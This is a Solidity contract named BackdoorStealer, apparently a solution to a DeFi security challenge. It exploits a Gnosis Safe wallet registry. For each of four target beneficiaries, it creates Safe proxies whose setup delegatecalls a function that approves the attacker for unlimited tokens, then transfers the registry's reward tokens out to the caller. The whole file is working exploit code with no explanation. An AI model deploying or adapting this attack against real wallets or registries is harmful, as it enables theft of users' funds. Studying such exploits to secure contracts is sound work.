pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";

contract BackdoorStealer {
  using Address for address;

  address immutable masterCopy;
  GnosisSafeProxyFactory immutable gnosisFactory;
  IProxyCreationCallback immutable walletRegistry;
  IERC20 immutable token;

  constructor(address _masterCopy, GnosisSafeProxyFactory _gnosisFactory, IProxyCreationCallback _walletRegistry, IERC20 _token) {
    masterCopy = _masterCopy;
    gnosisFactory = _gnosisFactory;
    walletRegistry = _walletRegistry;
    token = _token;
  }

  function steal(address spender) external {
    token.approve(spender, type(uint).max);
  }

  function attack(address[] memory targets) external {
    for (uint i = 0; i < 4; i++) {
      address[] memory x = new address[](1);
      x[0] = targets[i];
      bytes memory initializer = abi.encodeWithSelector(GnosisSafe.setup.selector,
        x,
        1,
        address(this),
        abi.encodeWithSignature("steal(address)", address(this)),
        address(0),
        0,
        0,
        0
      );

      GnosisSafeProxy proxy = gnosisFactory.createProxyWithCallback(
        masterCopy,
        initializer,
        i,
        walletRegistry
      );

      token.transferFrom(address(proxy), msg.sender, 10e18);
    }
  }
}
